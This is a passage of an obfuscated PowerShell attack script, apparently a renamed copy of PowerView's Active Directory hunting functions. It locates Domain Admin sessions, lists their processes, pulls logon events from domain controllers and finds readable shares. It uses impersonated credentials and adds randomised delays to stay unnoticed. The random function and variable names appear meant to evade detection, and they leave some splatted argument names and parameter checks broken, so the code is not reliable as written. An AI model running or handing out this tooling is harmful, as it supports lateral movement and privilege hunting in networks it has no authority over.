                            $XOIvwKgj99 = $User.UserName
                            $GOrSdVAL99 = $User.LogonDomain
                            if (($XOIvwKgj99) -and ($XOIvwKgj99.trim() -ne '')) {
                                if ( (-not $BvlgFmiy99) -or ($BvlgFmiy99 -contains $XOIvwKgj99) -and ($XOIvwKgj99 -notmatch '\$$')) {
                                    $PkMJVkaY99 = @(Mg -BoyAErDp99 $RrDltCuw99)[0].IPAddress
                                    $JVKbRRcM99 = New-Object PSObject
                                    $JVKbRRcM99 | Add-Member Noteproperty 'UserDomain' $GOrSdVAL99
                                    $JVKbRRcM99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                                    $JVKbRRcM99 | Add-Member Noteproperty 'ComputerName' $RrDltCuw99
                                    $JVKbRRcM99 | Add-Member Noteproperty 'IPAddress' $PkMJVkaY99
                                    $JVKbRRcM99 | Add-Member Noteproperty 'SessionFrom' $Null
                                    $JVKbRRcM99 | Add-Member Noteproperty 'SessionFromName' $Null
                                    if ($oYrVhlip99) {
                                        $Admin = runarounds -BoyAErDp99 $RrDltCuw99
                                        $JVKbRRcM99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $JVKbRRcM99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $JVKbRRcM99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $JVKbRRcM99
                                }
                            }
                        }
                    }
                }
            }
            if ($iJJxkpFW99) {
                enrolled
            }
        }
        $PcHfgoeR99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
            }
            else {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[steady] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[steady] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[steady] Enumerating server $YaYHUvEO99 ($pAOTTRkE99 of $($voVxECvy99.Count))"
                Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $BvlgFmiy99, $vGVRQpiU99, $ndJGDUTZ99, $PcHfgoeR99
                if ($rKtGlbHQ99 -and $wzKKlbLD99) {
                    Write-Verbose "[steady] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[steady] Using threading with threads: $KYLUFgiv99"
            Write-Verbose "[steady] TargetComputers length: $($voVxECvy99.Length)"
            $xcnPnXrE99 = @{
                'TargetUsers' = $BvlgFmiy99
                'CurrentUser' = $vGVRQpiU99
                'Stealth' = $ndJGDUTZ99
                'TokenHandle' = $PcHfgoeR99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
    END {
        if ($PcHfgoeR99) {
            enrolled -iJJxkpFW99 $PcHfgoeR99
        }
    }
}
function apprehending {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [Alias('Unconstrained')]
        [Switch]
        $MrWNSVjr99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $kTfkGTYy99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $TYwqHZTv99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $GOrSdVAL99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $MaTIhOlk99,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $AAAbQCdQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ENIJvIUJ99 = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $ZGzYZcEj99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $wzKKlbLD99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ZjqCBLnd99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['Unconstrained']) { $ZjqCBLnd99['Unconstrained'] = $GNUthHex99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        $jRryQntp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $jRryQntp99['Identity'] = $TYwqHZTv99 }
        if ($PSBoundParameters['Domain']) { $jRryQntp99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['UserDomain']) { $jRryQntp99['Domain'] = $GOrSdVAL99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $jRryQntp99['LDAPFilter'] = $MaTIhOlk99 }
        if ($PSBoundParameters['UserSearchBase']) { $jRryQntp99['SearchBase'] = $AAAbQCdQ99 }
        if ($PSBoundParameters['UserAdminCount']) { $jRryQntp99['AdminCount'] = $ZGzYZcEj99 }
        if ($PSBoundParameters['Server']) { $jRryQntp99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $jRryQntp99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $jRryQntp99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $jRryQntp99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $jRryQntp99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $jRryQntp99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            Write-Verbose '[apprehending] Querying computers in the domain'
            $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[apprehending] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[apprehending] No hosts found to enumerate'
        }
        if ($PSBoundParameters['ProcessName']) {
            $esEzkTlh99 = @()
            ForEach ($T in $kTfkGTYy99) {
                $esEzkTlh99 += $T.Split(',')
            }
            if ($esEzkTlh99 -isnot [System.Array]) {
                $esEzkTlh99 = [String[]] @($esEzkTlh99)
            }
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $BvlgFmiy99 = Lille @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $RbykXVFu99 = @{
                'Identity' = $ENIJvIUJ99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $RbykXVFu99['Domain'] = $GOrSdVAL99 }
            if ($PSBoundParameters['UserSearchBase']) { $RbykXVFu99['SearchBase'] = $AAAbQCdQ99 }
            if ($PSBoundParameters['Server']) { $RbykXVFu99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['SearchScope']) { $RbykXVFu99['SearchScope'] = $hZznjEbB99 }
            if ($PSBoundParameters['ResultPageSize']) { $RbykXVFu99['ResultPageSize'] = $jrZpVEwq99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $RbykXVFu99['ServerTimeLimit'] = $kkbrymyp99 }
            if ($PSBoundParameters['Tombstone']) { $RbykXVFu99['Tombstone'] = $YXMSPUCr99 }
            if ($PSBoundParameters['Credential']) { $RbykXVFu99['Credential'] = $DegNROrc99 }
            $RbykXVFu99
            $BvlgFmiy99 = Zaporozhye @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $kTfkGTYy99, $BvlgFmiy99, $DegNROrc99)
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    if ($DegNROrc99) {
                        $yrwlhJFv99 = scullions -DegNROrc99 $DegNROrc99 -BoyAErDp99 $RrDltCuw99 -ErrorAction SilentlyContinue
                    }
                    else {
                        $yrwlhJFv99 = scullions -BoyAErDp99 $RrDltCuw99 -ErrorAction SilentlyContinue
                    }
                    ForEach ($JMLDHLiW99 in $yrwlhJFv99) {
                        if ($kTfkGTYy99) {
                            if ($kTfkGTYy99 -Contains $JMLDHLiW99.ProcessName) {
                                $JMLDHLiW99
                            }
                        }
                        elseif ($BvlgFmiy99 -Contains $JMLDHLiW99.User) {
                            $JMLDHLiW99
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[apprehending] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[apprehending] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[apprehending] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                $rKtGlbHQ99 = Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $esEzkTlh99, $BvlgFmiy99, $DegNROrc99
                $rKtGlbHQ99
                if ($rKtGlbHQ99 -and $wzKKlbLD99) {
                    Write-Verbose "[apprehending] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[apprehending] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
                'ProcessName' = $esEzkTlh99
                'TargetUsers' = $BvlgFmiy99
                'Credential' = $DegNROrc99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
}
function tracheotomies {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $ypcTqVPU99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $OWJFpvqv99 = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $OenSunKo99 = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $KZqnpeYT99 = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $TYwqHZTv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $GOrSdVAL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MaTIhOlk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AAAbQCdQ99,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ENIJvIUJ99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ZGzYZcEj99,
        [Switch]
        $oYrVhlip99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $wzKKlbLD99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $jRryQntp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $jRryQntp99['Identity'] = $TYwqHZTv99 }
        if ($PSBoundParameters['UserDomain']) { $jRryQntp99['Domain'] = $GOrSdVAL99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $jRryQntp99['LDAPFilter'] = $MaTIhOlk99 }
        if ($PSBoundParameters['UserSearchBase']) { $jRryQntp99['SearchBase'] = $AAAbQCdQ99 }
        if ($PSBoundParameters['UserAdminCount']) { $jRryQntp99['AdminCount'] = $ZGzYZcEj99 }
        if ($PSBoundParameters['Server']) { $jRryQntp99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $jRryQntp99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $jRryQntp99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $jRryQntp99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $jRryQntp99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $jRryQntp99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount']) {
            $BvlgFmiy99 = Lille @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        elseif ($PSBoundParameters['UserGroupIdentity'] -or (-not $PSBoundParameters['Filter'])) {
            $RbykXVFu99 = @{
                'Identity' = $ENIJvIUJ99
                'Recurse' = $True
            }
            Write-Verbose "UserGroupIdentity: $ENIJvIUJ99"
            if ($PSBoundParameters['UserDomain']) { $RbykXVFu99['Domain'] = $GOrSdVAL99 }
            if ($PSBoundParameters['UserSearchBase']) { $RbykXVFu99['SearchBase'] = $AAAbQCdQ99 }
            if ($PSBoundParameters['Server']) { $RbykXVFu99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['SearchScope']) { $RbykXVFu99['SearchScope'] = $hZznjEbB99 }
            if ($PSBoundParameters['ResultPageSize']) { $RbykXVFu99['ResultPageSize'] = $jrZpVEwq99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $RbykXVFu99['ServerTimeLimit'] = $kkbrymyp99 }
            if ($PSBoundParameters['Tombstone']) { $RbykXVFu99['Tombstone'] = $YXMSPUCr99 }
            if ($PSBoundParameters['Credential']) { $RbykXVFu99['Credential'] = $DegNROrc99 }
            $BvlgFmiy99 = Zaporozhye @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            $VlrGIvqF99 = @{
                'LDAP' = $True
            }
            if ($PSBoundParameters['Domain']) { $VlrGIvqF99['Domain'] = $StsWGohF99 }
            if ($PSBoundParameters['Server']) { $VlrGIvqF99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['Credential']) { $VlrGIvqF99['Credential'] = $DegNROrc99 }
            Write-Verbose "[tracheotomies] Querying for domain controllers in domain: $StsWGohF99"
            $voVxECvy99 = skyrockets @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        if ($voVxECvy99 -and ($voVxECvy99 -isnot [System.Array])) {
            $voVxECvy99 = @(,$voVxECvy99)
        }
        Write-Verbose "[tracheotomies] TargetComputers length: $($voVxECvy99.Length)"
        Write-Verbose "[tracheotomies] TargetComputers $voVxECvy99"
        if ($voVxECvy99.Length -eq 0) {
            throw '[tracheotomies] No hosts found to enumerate'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $OWJFpvqv99, $OenSunKo99, $KZqnpeYT99, $BvlgFmiy99, $ypcTqVPU99, $DegNROrc99)
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    $WjuPmNKM99 = @{
                        'ComputerName' = $RrDltCuw99
                    }
                    if ($OWJFpvqv99) { $WjuPmNKM99['StartTime'] = $OWJFpvqv99 }
                    if ($OenSunKo99) { $WjuPmNKM99['EndTime'] = $OenSunKo99 }
                    if ($KZqnpeYT99) { $WjuPmNKM99['MaxEvents'] = $KZqnpeYT99 }
                    if ($DegNROrc99) { $WjuPmNKM99['Credential'] = $DegNROrc99 }
                    if ($ypcTqVPU99 -or $BvlgFmiy99) {
                        if ($BvlgFmiy99) {
                            quartette @DomainUserEventArgs | Where-Object {$BvlgFmiy99 -contains $_.TargetUserName}
                        }
                        else {
                            $CoSBxMAV99 = 'or'
                            $ypcTqVPU99.Keys | ForEach-Object {
                                if (($_ -eq 'Op') -or ($_ -eq 'Operator') -or ($_ -eq 'Operation')) {
                                    if (($ypcTqVPU99[$_] -match '&') -or ($ypcTqVPU99[$_] -eq 'and')) {
                                        $CoSBxMAV99 = 'and'
                                    }
                                }
                            }
                            $Keys = $ypcTqVPU99.Keys | Where-Object {($_ -ne 'Op') -and ($_ -ne 'Operator') -and ($_ -ne 'Operation')}
                            quartette @DomainUserEventArgs | ForEach-Object {
                                if ($CoSBxMAV99 -eq 'or') {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -match $ypcTqVPU99[$Key]) {
                                            $_
                                        }
                                    }
                                }
                                else {
                                    ForEach ($Key in $Keys) {
                                        if ($_."$Key" -notmatch $ypcTqVPU99[$Key]) {
                                            break
                                        }
                                        $_
                                    }
                                }
                            }
                        }
                    }
                    else {
                        quartette @DomainUserEventArgs
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[tracheotomies] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[tracheotomies] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[tracheotomies] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                $rKtGlbHQ99 = Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $OWJFpvqv99, $OenSunKo99, $KZqnpeYT99, $BvlgFmiy99, $ypcTqVPU99, $DegNROrc99
                $rKtGlbHQ99
                if ($rKtGlbHQ99 -and $wzKKlbLD99) {
                    Write-Verbose "[tracheotomies] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[tracheotomies] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
                'StartTime' = $OWJFpvqv99
                'EndTime' = $OenSunKo99
                'MaxEvents' = $KZqnpeYT99
                'TargetUsers' = $BvlgFmiy99
                'Filter' = $ypcTqVPU99
                'Credential' = $DegNROrc99
            }
            spaced -BoyAErDp99 $voVxECvy99 -VmbuGSUi99 $GQOwBNso99 -TuoSIuWn99 $xcnPnXrE99 -KYLUFgiv99 $KYLUFgiv99
        }
    }
}
function nourishing {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Alias('CheckAccess')]
        [Switch]
        $pRoiuLpi99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['Unconstrained']) { $ZjqCBLnd99['Unconstrained'] = $GNUthHex99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = $BoyAErDp99
        }
        else {
            Write-Verbose '[nourishing] Querying computers in the domain'
            $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[nourishing] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[nourishing] No hosts found to enumerate'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $pRoiuLpi99, $iJJxkpFW99)
            if ($iJJxkpFW99) {
                $Null = dizzied -iJJxkpFW99 $iJJxkpFW99 -Quiet
            }
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    $BETUrxBA99 = ridiculous -BoyAErDp99 $RrDltCuw99
                    ForEach ($Share in $BETUrxBA99) {
                        $MVreDyRZ99 = $Share.Name
                        $Path = '\\'+$RrDltCuw99+'\'+$MVreDyRZ99
                        if (($MVreDyRZ99) -and ($MVreDyRZ99.trim() -ne '')) {
                            if ($pRoiuLpi99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($iJJxkpFW99) {
                enrolled
            }
        }
        $PcHfgoeR99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99
            }
            else {
                $PcHfgoeR99 = dizzied -DegNROrc99 $DegNROrc99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[nourishing] Total number of hosts: $($voVxECvy99.count)"
            Write-Verbose "[nourishing] Delay: $Delay, Jitter: $hFAFUxDJ99"
            $pAOTTRkE99 = 0
            $TIOJdLfI99 = New-Object System.Random
            ForEach ($RrDltCuw99 in $voVxECvy99) {
                $pAOTTRkE99 = $pAOTTRkE99 + 1
                Start-Sleep -Seconds $TIOJdLfI99.Next((1-$hFAFUxDJ99)*$Delay, (1+$hFAFUxDJ99)*$Delay)
                Write-Verbose "[nourishing] Enumerating server $RrDltCuw99 ($pAOTTRkE99 of $($voVxECvy99.count))"
                Invoke-Command -VmbuGSUi99 $GQOwBNso99 -ArgumentList $RrDltCuw99, $pRoiuLpi99, $PcHfgoeR99
            }
        }
        else {
            Write-Verbose "[nourishing] Using threading with threads: $KYLUFgiv99"
            $xcnPnXrE99 = @{
